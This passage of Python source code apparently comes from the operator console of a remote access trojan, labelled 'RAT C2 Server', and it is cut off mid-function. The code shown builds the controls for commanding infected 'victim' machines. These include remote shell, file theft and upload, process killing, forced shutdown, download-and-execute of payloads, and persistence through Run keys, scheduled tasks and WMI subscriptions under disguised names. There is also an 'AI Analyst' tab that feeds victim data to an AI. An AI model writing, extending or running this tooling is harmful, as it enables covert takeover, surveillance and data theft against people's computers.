        self._tunnel            = TunnelManager()  # manages ngrok / SSH tunnel subprocesses
        self._auth_token        = ""       # current auth token (synced from header Entry widget)
        # ── AI Analyst tab state ──────────────────────────────────────────────
        self._ai_history        = []       # list of {"role": ..., "content": ...} dicts (max 40)
        self._ai_context        = ""       # victim system info injected into the AI system prompt

        # ── Build and launch the UI ───────────────────────────────────────────
        self._build_styles()    # configure ttk.Style for the themed Combobox / Notebook
        self._build_ui()        # construct all widgets (header, notebook, tabs, status bar)
        self._process_queue()   # start the 80 ms GUI-queue polling loop
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)   # clean shutdown hook
        self.root.mainloop()    # hand control to the Tkinter event loop (blocks until close)

    def _set_app_icon(self):
        try:
            from PIL import Image, ImageDraw, ImageFont, ImageTk
            import math
            size = 64
            img = Image.new("RGBA", (size, size), (0, 0, 0, 0))
            d = ImageDraw.Draw(img)
            bg_col  = (18, 19, 26, 255)
            fg_col  = (255, 140, 0, 255)
            cx, cy  = size // 2, size // 2
            img.paste(bg_col, [0, 0, size, size])
            lobe_r  = 14
            arm_r   = 9
            for angle_deg in (90, 210, 330):
                rad = math.radians(angle_deg)
                lx  = int(cx + arm_r * math.cos(rad))
                ly  = int(cy - arm_r * math.sin(rad))
                d.ellipse([lx - lobe_r, ly - lobe_r,
                            lx + lobe_r, ly + lobe_r], fill=fg_col)
            center_kill_r = 10
            d.ellipse([cx - center_kill_r, cy - center_kill_r,
                        cx + center_kill_r, cy + center_kill_r], fill=bg_col)
            core_r = 6
            d.ellipse([cx - core_r, cy - core_r,
                        cx + core_r, cy + core_r], fill=fg_col)
            inner_r = 3
            d.ellipse([cx - inner_r, cy - inner_r,
                        cx + inner_r, cy + inner_r], fill=bg_col)
            for angle_deg in (90, 210, 330):
                rad  = math.radians(angle_deg)
                x0   = int(cx + core_r * math.cos(rad))
                y0   = int(cy - core_r * math.sin(rad))
                x1   = int(cx + (center_kill_r + 1) * math.cos(rad))
                y1   = int(cy - (center_kill_r + 1) * math.sin(rad))
                d.line([x0, y0, x1, y1], fill=bg_col, width=3)
            img = img.resize((32, 32), Image.LANCZOS)
            self._icon_img = ImageTk.PhotoImage(img)
            self.root.iconphoto(True, self._icon_img)
        except Exception:
            pass

    def _build_styles(self):
        style = ttk.Style(self.root)
        style.theme_use("clam")
        style.configure(".", background=C["bg2"], foreground=C["text"],
                        font=FONT_UI_SM, borderwidth=0)
        style.configure("TNotebook", background=C["bg"], tabmargins=[0, 0, 0, 0])
        style.configure("TNotebook.Tab",
                        background=C["bg3"], foreground=C["text2"],
                        padding=[14, 6], font=FONT_UI_SM)
        style.map("TNotebook.Tab",
                  background=[("selected", C["bg2"])],
                  foreground=[("selected", C["accent"])])
        style.configure("Treeview",
                        background=C["bg2"], fieldbackground=C["bg2"],
                        foreground=C["text"], rowheight=24,
                        borderwidth=0, font=FONT_UI_SM)
        style.configure("Treeview.Heading",
                        background=C["bg3"], foreground=C["text2"],
                        relief="flat", font=FONT_UI_SM)
        style.map("Treeview",
                  background=[("selected", C["sel"])],
                  foreground=[("selected", C["accent"])])
        style.configure("Vertical.TScrollbar",
                        background=C["bg3"], troughcolor=C["bg2"],
                        arrowcolor=C["text2"], borderwidth=0)

    def _build_ui(self):
        self._build_header()
        body = _frame(self.root, bg=C["bg"])
        body.pack(fill="both", expand=True)
        pw = tk.PanedWindow(body, orient="horizontal", sashwidth=4,
                            bg=C["border"], bd=0, relief="flat")
        pw.pack(fill="both", expand=True)
        pw.add(self._build_client_panel(pw), minsize=220, width=260)
        pw.add(self._build_main_panel(pw),   minsize=600)
        self._build_statusbar()

    def _build_header(self):
        hdr = _frame(self.root, bg=C["bg3"])
        hdr.pack(fill="x")
        tk.Label(hdr, text=" \u2623  RAT C2 Server", bg=C["bg3"], fg=C["accent"],
                 font=FONT_TITLE, padx=12, pady=10).pack(side="left")
        right = _frame(hdr, bg=C["bg3"])
        right.pack(side="right", padx=12, pady=6)
        tk.Label(right, text="Host:", bg=C["bg3"], fg=C["text2"],
                 font=FONT_UI_SM).pack(side="left")
        self._var_host = tk.StringVar(value="0.0.0.0")
        _entry(right, self._var_host, width=12).pack(side="left", padx=(2, 10))
        tk.Label(right, text="Port:", bg=C["bg3"], fg=C["text2"],
                 font=FONT_UI_SM).pack(side="left")
        self._var_port = tk.StringVar(value=str(DEFAULT_PORT))
        _entry(right, self._var_port, width=6).pack(side="left", padx=(2, 10))
        tk.Label(right, text="C2 Secret (optional):", bg=C["bg3"], fg=C["text2"],
                 font=FONT_UI_SM).pack(side="left")
        self._var_token = tk.StringVar(value="")
        _entry(right, self._var_token, width=14).pack(side="left", padx=(2, 4))
        _btn(right, "✕", lambda: self._var_token.set(""),
             fg=C["error"], width=2).pack(side="left", padx=(0, 10))
        self._var_token.trace_add("write", self._on_token_change)
        self._btn_toggle = _btn(right, "\u25b6  Start", self._toggle_server,
                                fg=C["success"], width=10)
        self._btn_toggle.pack(side="left")
        self._lbl_srv = tk.Label(hdr, text="\u25cf Stopped", bg=C["bg3"],
                                 fg=C["error"], font=("Segoe UI", 9, "bold"), padx=10)
        self._lbl_srv.pack(side="left", padx=6)

    def _build_client_panel(self, parent):
        frame = _frame(parent, bg=C["panel"])
        hdr = _frame(frame, bg=C["bg3"])
        hdr.pack(fill="x")
        tk.Label(hdr, text="CLIENTS", bg=C["bg3"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold"), padx=10, pady=8).pack(side="left")
        self._lbl_client_count = tk.Label(hdr, text="0", bg=C["accent2"],
                                          fg="white", font=("Segoe UI", 8, "bold"),
                                          padx=6, pady=2)
        self._lbl_client_count.pack(side="right", padx=8)
        tree_frame = _frame(frame, bg=C["panel"])
        tree_frame.pack(fill="both", expand=True, padx=6, pady=6)
        self._client_tree = ttk.Treeview(tree_frame, selectmode="browse",
                                         show="tree", columns=())
        sb = ttk.Scrollbar(tree_frame, orient="vertical",
                           command=self._client_tree.yview)
        self._client_tree.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y")
        self._client_tree.pack(fill="both", expand=True)
        self._client_tree.bind("<<TreeviewSelect>>", self._on_client_select)
        _sep(frame).pack(fill="x")
        _btn(frame, "\u2716  Disconnect", self._disconnect_client,
             fg=C["error"]).pack(fill="x", padx=8, pady=6)
        return frame

    def _build_main_panel(self, parent):
        frame = _frame(parent, bg=C["bg"])
        self._notebook = ttk.Notebook(frame)
        self._notebook.pack(fill="both", expand=True)
        self._tab_shell        = _frame(self._notebook, bg=C["bg2"])
        self._tab_files        = _frame(self._notebook, bg=C["bg2"])
        self._tab_processes    = _frame(self._notebook, bg=C["bg2"])
        self._tab_system       = _frame(self._notebook, bg=C["bg2"])
        self._tab_surveillance = _frame(self._notebook, bg=C["bg2"])
        self._tab_postex       = _frame(self._notebook, bg=C["bg2"])
        self._tab_ai           = _frame(self._notebook, bg=C["bg2"])
        self._tab_tunnel       = _frame(self._notebook, bg=C["bg2"])
        self._tab_payload      = _frame(self._notebook, bg=C["bg2"])
        self._notebook.add(self._tab_shell,        text="  Shell  ")
        self._notebook.add(self._tab_files,        text="  Files  ")
        self._notebook.add(self._tab_processes,    text="  Processes  ")
        self._notebook.add(self._tab_system,       text="  System  ")
        self._notebook.add(self._tab_surveillance, text="  Surveillance  ")
        self._notebook.add(self._tab_postex,       text="  Post-Exploit  ")
        self._notebook.add(self._tab_ai,           text="  \U0001f916 AI Analyst  ")
        self._notebook.add(self._tab_tunnel,       text="  Tunnel  ")
        self._notebook.add(self._tab_payload,      text="  Payload  ")
        self._build_shell_tab()
        self._build_files_tab()
        self._build_processes_tab()
        self._build_system_tab()
        self._build_surveillance_tab()
        self._build_postex_tab()
        self._build_ai_tab()
        self._build_tunnel_tab()
        self._build_payload_tab()
        return frame

    def _build_shell_tab(self):
        p = self._tab_shell
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="Remote Shell", bg=C["bg3"], fg=C["accent"],
                 font=FONT_UI_B, padx=10, pady=8).pack(side="left")
        _btn(toolbar, "Clear", self._shell_clear,
             fg=C["text2"]).pack(side="right", padx=8, pady=4)
        self._shell_out = scrolledtext.ScrolledText(
            p, bg=C["term_bg"], fg=C["term_fg"], insertbackground=C["term_fg"],
            font=FONT_MONO, relief="flat", wrap="word", state="disabled",
            selectbackground=C["sel"],
        )
        self._shell_out.pack(fill="both", expand=True)
        inp_frame = _frame(p, bg=C["bg3"])
        inp_frame.pack(fill="x")
        tk.Label(inp_frame, text="$", bg=C["bg3"], fg=C["term_fg"],
                 font=FONT_MONO, padx=8).pack(side="left")
        self._shell_var = tk.StringVar()
        self._shell_entry = tk.Entry(
            inp_frame, textvariable=self._shell_var,
            bg=C["term_bg"], fg=C["term_fg"], insertbackground=C["term_fg"],
            relief="flat", font=FONT_MONO, bd=0,
        )
        self._shell_entry.pack(side="left", fill="x", expand=True, ipady=7)
        self._shell_entry.bind("<Return>", lambda e: self._shell_execute())
        _btn(inp_frame, "Run", self._shell_execute,
             fg=C["bg"], bg=C["accent"]).pack(side="right", padx=6, pady=4)

    def _shell_clear(self):
        self._shell_out.configure(state="normal")
        self._shell_out.delete("1.0", "end")
        self._shell_out.configure(state="disabled")

    def _shell_append(self, text):
        self._shell_out.configure(state="normal")
        self._shell_out.insert("end", text)
        self._shell_out.see("end")
        self._shell_out.configure(state="disabled")

    def _shell_execute(self):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        command = self._shell_var.get().strip()
        if not command:
            return
        self._shell_var.set("")
        self._shell_append(f"$ {command}\n")
        self._set_status("Executing command...")

        def worker():
            try:
                resp = client.send_command({"type": "shell", "command": command})
                if resp["status"] == "ok":
                    self.gui_queue.put(("shell_out", resp["data"] + "\n"))
                else:
                    self.gui_queue.put(("shell_out", f"[ERROR] {resp['message']}\n"))
            except Exception as exc:
                self.gui_queue.put(("shell_out", f"[ERROR] {exc}\n"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))
            self.gui_queue.put(("status", "Ready"))

        threading.Thread(target=worker, daemon=True).start()

    def _build_files_tab(self):
        p = self._tab_files
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="File Explorer", bg=C["bg3"], fg=C["accent"],
                 font=FONT_UI_B, padx=10, pady=8).pack(side="left")
        self._file_path_var = tk.StringVar(value="C:\\")
        path_entry = tk.Entry(
            toolbar, textvariable=self._file_path_var,
            bg=C["entry"], fg=C["text"], insertbackground=C["text"],
            relief="flat", font=FONT_MONO_SM, width=40,
        )
        path_entry.pack(side="left", padx=6, ipady=4)
        path_entry.bind("<Return>",
                        lambda e: self._files_navigate(self._file_path_var.get()))
        _btn(toolbar, "Go",
             lambda: self._files_navigate(self._file_path_var.get()),
             fg=C["accent"]).pack(side="left", padx=(0, 4))
        _btn(toolbar, "\u2191 Up", self._files_go_up).pack(side="left")
        _btn(toolbar, "\u27f3 Refresh",
             lambda: self._files_navigate(self._file_path_var.get())).pack(side="left", padx=4)
        tree_frame = _frame(p, bg=C["bg2"])
        tree_frame.pack(fill="both", expand=True, padx=6, pady=6)
        cols = ("name", "size", "type")
        self._file_tree = ttk.Treeview(tree_frame, columns=cols,
                                       show="headings", selectmode="browse")
        self._file_tree.heading("name", text="Name")
        self._file_tree.heading("size", text="Size")
        self._file_tree.heading("type", text="Type")
        self._file_tree.column("name", width=400, stretch=True)
        self._file_tree.column("size", width=100, anchor="e")
        self._file_tree.column("type", width=80,  anchor="center")
        self._file_tree.tag_configure("dir",  foreground=C["accent"])
        self._file_tree.tag_configure("file", foreground=C["text"])
        vsb = ttk.Scrollbar(tree_frame, orient="vertical",
                            command=self._file_tree.yview)
        self._file_tree.configure(yscrollcommand=vsb.set)
        vsb.pack(side="right", fill="y")
        self._file_tree.pack(fill="both", expand=True)
        self._file_tree.bind("<Double-1>", self._files_on_double_click)
        act_frame = _frame(p, bg=C["bg3"])
        act_frame.pack(fill="x")
        for label, cmd, color in [
            ("\u2b07 Download", self._files_download, C["success"]),
            ("\u2b06 Upload",   self._files_upload,   C["accent"]),
            ("\u2716 Delete",   self._files_delete,   C["error"]),
        ]:
            _btn(act_frame, label, cmd, fg=color).pack(side="left", padx=6, pady=6)

    def _files_navigate(self, path):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._set_status(f"Listing {path}...")

        def worker():
            try:
                resp = client.send_command({"type": "file_list", "path": path})
                if resp["status"] == "ok":
                    self.gui_queue.put(("file_list", path, resp["data"]))
                else:
                    self.gui_queue.put(("status", f"Error: {resp['message']}"))
            except Exception as exc:
                self.gui_queue.put(("status", f"Error: {exc}"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))

        threading.Thread(target=worker, daemon=True).start()

    def _files_go_up(self):
        path   = self._file_path_var.get().rstrip("\\/")
        parent = os.path.dirname(path)
        if parent and parent != path:
            self._files_navigate(parent)

    def _files_on_double_click(self, event):
        sel = self._file_tree.selection()
        if not sel:
            return
        try:
            idx  = int(sel[0])
            item = self._file_items[idx]
            if item["is_dir"]:
                self._files_navigate(item["path"])
        except (ValueError, IndexError):
            pass

    def _files_download(self):
        client = self._selected_client
        if not client:
            return
        sel = self._file_tree.selection()
        if not sel:
            messagebox.showinfo("Select file", "Select a file to download.")
            return
        try:
            idx  = int(sel[0])
            item = self._file_items[idx]
        except (ValueError, IndexError):
            return
        if item["is_dir"]:
            messagebox.showinfo("File only", "Select a file, not a folder.")
            return
        save_path = filedialog.asksaveasfilename(initialfile=item["name"],
                                                  title="Save downloaded file")
        if not save_path:
            return
        self._set_status(f"Downloading {item['name']}...")

        def worker():
            try:
                resp = client.send_command(
                    {"type": "file_download", "path": item["path"]})
                if resp["status"] == "ok":
                    data = base64.b64decode(resp["data"])
                    with open(save_path, "wb") as fh:
                        fh.write(data)
                    self.gui_queue.put(("status", f"Saved to {save_path}"))
                    self.gui_queue.put(("msgbox", "Download complete",
                                        f"File saved to:\n{save_path}"))
                else:
                    self.gui_queue.put(("status", f"Error: {resp['message']}"))
            except Exception as exc:
                self.gui_queue.put(("status", f"Error: {exc}"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))

        threading.Thread(target=worker, daemon=True).start()

    def _files_upload(self):
        client = self._selected_client
        if not client:
            return
        local_path = filedialog.askopenfilename(title="Select file to upload")
        if not local_path:
            return
        current     = self._file_path_var.get().rstrip("\\/")
        filename    = os.path.basename(local_path)
        remote_path = current + "\\" + filename
        self._set_status(f"Uploading {filename}...")

        def worker():
            try:
                with open(local_path, "rb") as fh:
                    data_b64 = base64.b64encode(fh.read()).decode("utf-8")
                resp = client.send_command(
                    {"type": "file_upload", "path": remote_path, "data": data_b64})
                if resp["status"] == "ok":
                    self.gui_queue.put(("status", "Upload complete"))
                    self.gui_queue.put(("refresh_files", current))
                else:
                    self.gui_queue.put(("status", f"Upload error: {resp['message']}"))
            except Exception as exc:
                self.gui_queue.put(("status", f"Error: {exc}"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))

        threading.Thread(target=worker, daemon=True).start()

    def _files_delete(self):
        client = self._selected_client
        if not client:
            return
        sel = self._file_tree.selection()
        if not sel:
            messagebox.showinfo("Select item", "Select a file or folder to delete.")
            return
        try:
            idx  = int(sel[0])
            item = self._file_items[idx]
        except (ValueError, IndexError):
            return
        if not messagebox.askyesno("Confirm delete",
                                   f"Permanently delete:\n{item['path']}?"):
            return

        def worker():
            try:
                resp    = client.send_command(
                    {"type": "file_delete", "path": item["path"]})
                current = self._file_path_var.get()
                if resp["status"] == "ok":
                    self.gui_queue.put(("status", "Deleted"))
                    self.gui_queue.put(("refresh_files", current))
                else:
                    self.gui_queue.put(("status", f"Error: {resp['message']}"))
            except Exception as exc:
                self.gui_queue.put(("status", f"Error: {exc}"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))

        threading.Thread(target=worker, daemon=True).start()

    def _files_populate(self, path, entries):
        self._file_path_var.set(path)
        self._file_current_path = path
        self._file_items        = entries
        for row in self._file_tree.get_children():
            self._file_tree.delete(row)
        for i, item in enumerate(entries):
            tag   = "dir" if item["is_dir"] else "file"
            icon  = "\U0001f4c1" if item["is_dir"] else "\U0001f4c4"
            size  = "" if item["is_dir"] else self._format_size(item.get("size", 0))
            ftype = "Folder" if item["is_dir"] else "File"
            self._file_tree.insert("", "end", iid=str(i),
                                   values=(f"{icon} {item['name']}", size, ftype),
                                   tags=(tag,))
        self._set_status(f"Listed {len(entries)} items in {path}")

    @staticmethod
    def _format_size(size):
        for unit in ("B", "KB", "MB", "GB"):
            if size < 1024:
                return f"{size:.0f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"

    def _build_processes_tab(self):
        p = self._tab_processes
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="Process Manager", bg=C["bg3"], fg=C["accent"],
                 font=FONT_UI_B, padx=10, pady=8).pack(side="left")
        self._proc_filter_var = tk.StringVar()
        tk.Label(toolbar, text="Filter:", bg=C["bg3"], fg=C["text2"],
                 font=FONT_UI_SM).pack(side="left", padx=(20, 4))
        fe = _entry(toolbar, self._proc_filter_var, width=18)
        fe.pack(side="left")
        fe.bind("<KeyRelease>", lambda e: self._proc_apply_filter())
        _btn(toolbar, "\u27f3 Refresh", self._proc_refresh,
             fg=C["accent"]).pack(side="right", padx=6, pady=4)
        _btn(toolbar, "\u2716 Kill Selected", self._proc_kill,
             fg=C["error"]).pack(side="right", padx=(0, 6), pady=4)
        tree_frame = _frame(p, bg=C["bg2"])
        tree_frame.pack(fill="both", expand=True, padx=6, pady=6)
        cols = ("pid", "name", "cpu", "mem", "title")
        self._proc_tree = ttk.Treeview(tree_frame, columns=cols,
                                       show="headings", selectmode="browse")
        for col, heading, w, anc in [
            ("pid",   "PID",          60,  "center"),
            ("name",  "Name",         200, "w"),
            ("cpu",   "CPU (s)",      80,  "e"),
            ("mem",   "Mem (MB)",     90,  "e"),
            ("title", "Window Title", 1,   "w"),
        ]:
            self._proc_tree.heading(col, text=heading)
            self._proc_tree.column(col, width=w, anchor=anc,
                                   stretch=(col == "title"))
        vsb = ttk.Scrollbar(tree_frame, orient="vertical",
                            command=self._proc_tree.yview)
        self._proc_tree.configure(yscrollcommand=vsb.set)
        vsb.pack(side="right", fill="y")
        self._proc_tree.pack(fill="both", expand=True)
        self._proc_status = tk.Label(p, text="Click Refresh to load processes",
                                     bg=C["bg3"], fg=C["text2"], font=FONT_UI_SM,
                                     anchor="w", padx=10, pady=4)
        self._proc_status.pack(fill="x")

    def _proc_refresh(self):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        self._proc_status.configure(text="Loading...")

        def worker():
            try:
                resp = client.send_command({"type": "process_list"})
                if resp["status"] == "ok":
                    self.gui_queue.put(("proc_list", resp["data"]))
                else:
                    self.gui_queue.put(("proc_list_err", resp["message"]))
            except Exception as exc:
                self.gui_queue.put(("proc_list_err", str(exc)))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))

        threading.Thread(target=worker, daemon=True).start()

    def _proc_apply_filter(self):
        filt = self._proc_filter_var.get().lower()
        all_iids = list(self._proc_tree.get_children()) + self._proc_detached
        self._proc_detached = []
        for iid in all_iids:
            try:
                self._proc_tree.reattach(iid, "", "end")
            except Exception:
                pass
        if not filt:
            return
        for iid in list(self._proc_tree.get_children()):
            try:
                name = self._proc_tree.set(iid, "name").lower()
                if filt not in name:
                    self._proc_tree.detach(iid)
                    self._proc_detached.append(iid)
            except Exception:
                pass

    def _proc_populate(self, data):
        self._proc_detached = []
        for row in self._proc_tree.get_children():
            self._proc_tree.delete(row)
        if not data:
            self._proc_status.configure(text="No process data returned")
            return
        if isinstance(data, dict):
            data = [data]
        self._proc_items = data
        for item in data:
            self._proc_tree.insert("", "end",
                values=(item.get("pid", ""),
                        item.get("name", ""),
                        item.get("cpu", ""),
                        item.get("mem", ""),
                        item.get("title", "")))
        self._proc_status.configure(text=f"{len(data)} processes")
        self._proc_apply_filter()

    def _proc_kill(self):
        client = self._selected_client
        if not client:
            return
        sel = self._proc_tree.selection()
        if not sel:
            messagebox.showinfo("Select", "Select a process row first.")
            return
        pid  = int(self._proc_tree.set(sel[0], "pid"))
        name = self._proc_tree.set(sel[0], "name")
        if not messagebox.askyesno("Kill process", f"Kill {name} (PID {pid})?"):
            return

        def worker():
            try:
                resp = client.send_command({"type": "process_kill", "pid": pid})
                if resp["status"] == "ok":
                    self.gui_queue.put(("status", f"Killed {name} ({pid})"))
                    self.gui_queue.put(("proc_refresh", None))
                else:
                    self.gui_queue.put(("status", f"Kill error: {resp['message']}"))
            except Exception as exc:
                self.gui_queue.put(("status", f"Error: {exc}"))
                if not client.connected:
                    self.gui_queue.put(("client_disconnect", client.id))

        threading.Thread(target=worker, daemon=True).start()

    def _build_system_tab(self):
        p = self._tab_system
        toolbar = _frame(p, bg=C["bg3"])
        toolbar.pack(fill="x")
        tk.Label(toolbar, text="System Control", bg=C["bg3"], fg=C["accent"],
                 font=FONT_UI_B, padx=10, pady=8).pack(side="left")
        body = _frame(p, bg=C["bg2"])
        body.pack(fill="both", expand=True)
        left_outer = _frame(body, bg=C["bg2"])
        left_outer.pack(side="left", fill="y")
        canvas = tk.Canvas(left_outer, bg=C["bg2"], highlightthickness=0, width=230)
        sb     = ttk.Scrollbar(left_outer, orient="vertical", command=canvas.yview)
        lc     = _frame(canvas, bg=C["bg2"])
        lc.bind("<Configure>",
                lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=lc, anchor="nw", width=230)
        canvas.configure(yscrollcommand=sb.set)

        def _mwheel(e):
            canvas.yview_scroll(int(-1 * (e.delta / 120)), "units")
        canvas.bind("<MouseWheel>", _mwheel)
        lc.bind("<MouseWheel>", _mwheel)
        sb.pack(side="right", fill="y")
        canvas.pack(side="left", fill="y")

        def _hdr(txt):
            tk.Label(lc, text=txt, bg=C["bg3"], fg=C["text2"],
                     font=("Segoe UI", 8, "bold"),
                     padx=8, pady=4).pack(fill="x", pady=(8, 2))

        _hdr("\u2500  INFORMATION")
        for lbl, cmd, col in [
            ("\u2139  OS Info",    lambda: self._sys_info_os(),                                                                   C["accent"]),
            ("\U0001f310  Network", lambda: self._sys_from_info("network_adapters", "Network",  {"type": "network_info"}),        C["accent"]),
            ("\U0001f4be  Drives",  lambda: self._sys_from_info("drives",           "Drives",   {"type": "drive_list"}),          C["text3"]),
            ("\U0001f465  Users",   lambda: self._sys_from_info("users",            "Users",    {"type": "list_users"}),          C["text3"]),
            ("\u23f1  Uptime",      lambda: self._sys_from_info("uptime",           "Uptime",   {"type": "uptime"}),              C["text3"]),
            ("\U0001f4cb  Env",     lambda: self._sys_from_info("env_vars",         "Env Vars", {"type": "env_vars"}),            C["text2"]),
        ]:
            _btn(lc, lbl, cmd, fg=col, anchor="w").pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  POWER / ACCESS")
        for lbl, cmd, col in [
            ("\U0001f512  Lock Screen", self._sys_lock,    C["text"]),
            ("\U0001f6aa  Sign Out",    self._sys_signout,  C["text"]),
            ("\U0001f504  Restart",     self._sys_restart,  C["warning"]),
            ("\u23fb   Shutdown",       self._sys_shutdown, C["error"]),
        ]:
            _btn(lc, lbl, cmd, fg=col, anchor="w").pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  OPEN URL ON VICTIM")
        self._url_var = tk.StringVar(value="https://")
        _entry(lc, self._url_var, width=26).pack(fill="x", padx=6, pady=2)
        _btn(lc, "Open URL", self._sys_open_url, fg=C["accent"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  POPUP ON VICTIM")
        self._msgbox_title_var = tk.StringVar(value="System")
        self._msgbox_msg_var   = tk.StringVar(value="Hello from C2!")
        _entry(lc, self._msgbox_title_var, width=26).pack(fill="x", padx=6, pady=2)
        _entry(lc, self._msgbox_msg_var,   width=26).pack(fill="x", padx=6, pady=2)
        _btn(lc, "Send MessageBox", self._sys_msgbox, fg=C["warning"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  DOWNLOAD & EXECUTE")
        self._dlexec_url_var  = tk.StringVar(value="http://")
        self._dlexec_dest_var = tk.StringVar(value="")
        _entry(lc, self._dlexec_url_var,  width=26).pack(fill="x", padx=6, pady=2)
        tk.Label(lc, text="Save path (blank=TEMP):", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        _entry(lc, self._dlexec_dest_var, width=26).pack(fill="x", padx=6, pady=2)
        _btn(lc, "Download & Execute", self._sys_dlexec, fg=C["error"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  PERSISTENCE (Run Key)")
        self._persist_name_var = tk.StringVar(value="WindowsHelper")
        self._persist_path_var = tk.StringVar(value="C:\\Users\\Public\\payload.bat")
        tk.Label(lc, text="Entry name:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        _entry(lc, self._persist_name_var, width=26).pack(fill="x", padx=6, pady=2)
        tk.Label(lc, text="Path to BAT on victim:", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        _entry(lc, self._persist_path_var, width=26).pack(fill="x", padx=6, pady=2)
        _btn(lc, "Add Run Key", self._sys_persist_add,
             fg=C["success"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "Remove Run Key", self._sys_persist_remove,
             fg=C["error"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "Add Scheduled Task", self._sys_task_add,
             fg=C["success"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "Remove Scheduled Task", self._sys_task_remove,
             fg=C["error"]).pack(fill="x", padx=6, pady=1)

        _hdr("\u2500  PERSISTENCE (WMI Subscription)")
        tk.Label(lc, text="WMI name (default WUService):", bg=C["bg2"],
                 fg=C["text2"], font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        self._wmi_name_var = tk.StringVar(value="WUService")
        _entry(lc, self._wmi_name_var, width=26).pack(fill="x", padx=6, pady=2)
        tk.Label(lc, text="PS1 path on victim (blank=auto):", bg=C["bg2"],
                 fg=C["text2"], font=("Segoe UI", 8)).pack(anchor="w", padx=6)
        self._wmi_path_var = tk.StringVar(value="")
        _entry(lc, self._wmi_path_var, width=26).pack(fill="x", padx=6, pady=2)
        _btn(lc, "Add WMI Persist", self._sys_wmi_add,
             fg=C["success"]).pack(fill="x", padx=6, pady=1)
        _btn(lc, "Remove WMI Persist", self._sys_wmi_remove,
             fg=C["error"]).pack(fill="x", padx=6, pady=(1, 2))

        _hdr("\u2500  WALLPAPER")
        self._wallpaper_var = tk.StringVar()
        wp_row = _frame(lc, bg=C["bg2"])
        wp_row.pack(fill="x", padx=6, pady=2)
        _entry(wp_row, self._wallpaper_var, width=18).pack(side="left")
        _btn(wp_row, "...", lambda: self._wallpaper_var.set(
             filedialog.askopenfilename(
                 title="Pick image for wallpaper",
                 filetypes=[("Images", "*.bmp *.jpg *.jpeg *.png")])),
             fg=C["text2"]).pack(side="left", padx=2)
        _btn(lc, "Set Wallpaper on Victim", self._sys_wallpaper,
             fg=C["accent2"]).pack(fill="x", padx=6, pady=(1, 8))

        right_col = _frame(body, bg=C["bg2"])
        right_col.pack(side="left", fill="both", expand=True, padx=(4, 0))
        tk.Label(right_col, text="OUTPUT", bg=C["bg2"], fg=C["text2"],
                 font=("Segoe UI", 8, "bold")).pack(anchor="w", padx=6, pady=(8, 4))
        self._sys_out = scrolledtext.ScrolledText(
            right_col, bg=C["term_bg"], fg=C["text3"],
            insertbackground=C["text"], font=FONT_MONO_SM,
            relief="flat", wrap="word", state="disabled",
            selectbackground=C["sel"],
        )
        self._sys_out.pack(fill="both", expand=True, padx=4, pady=(0, 4))

    def _sys_append(self, text):
        self._sys_out.configure(state="normal")
        self._sys_out.insert("end", text)
        self._sys_out.see("end")
        self._sys_out.configure(state="disabled")

    def _sys_from_info(self, info_key, label, live_cmd):
        """Cache-first: display session.info[info_key] instantly; live fallback if absent."""
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        cached = client.info.get(info_key)
        if cached is not None and cached not in ("?", "", [], {}):
            if isinstance(cached, list):
                parts = []
                for item in cached:
                    if isinstance(item, dict):
                        parts.append("  " + "  ".join(f"{k}={v}" for k, v in item.items()))
                    else:
                        parts.append(f"  {item}")
                text = f"[{label}] ★cached\n" + "\n".join(parts) + "\n\n"
            elif isinstance(cached, dict):
                text = f"[{label}] ★cached\n" + "\n".join(
                    f"  {k}: {v}" for k, v in cached.items()) + "\n\n"
            else:
                text = f"[{label}] ★cached  {cached}\n"
            self.gui_queue.put(("sys_out", text))
            self._set_status(f"{label} (cached)")
            return
        self._send_sys_cmd(live_cmd, label)

    def _sys_info_os(self):
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        if client.info:
            lines = []
            for k, v in client.info.items():
                if isinstance(v, list):
                    lines.append(f"  {k}: [{len(v)} items]")
                else:
                    lines.append(f"  {k}: {v}")
            self.gui_queue.put(("sys_out", "[OS Info] ★cached\n" + "\n".join(lines) + "\n\n"))
            self._set_status("OS Info (cached)")
        else:
            self._send_sys_cmd({"type": "os_info"}, "OS Info")

    def _surv_from_info(self, info_key, label, live_cmd, cb=None):
        """Cache-first for surveillance tab fields."""
        client = self._selected_client
        if not client:
            messagebox.showwarning("No client", "Select a client first.")
            return
        cached = client.info.get(info_key)
        if cached is not None and cached not in ("?", "", [], {}):
            if isinstance(cached, dict):
                text = f"[{label}] ★cached  " + "  ".join(
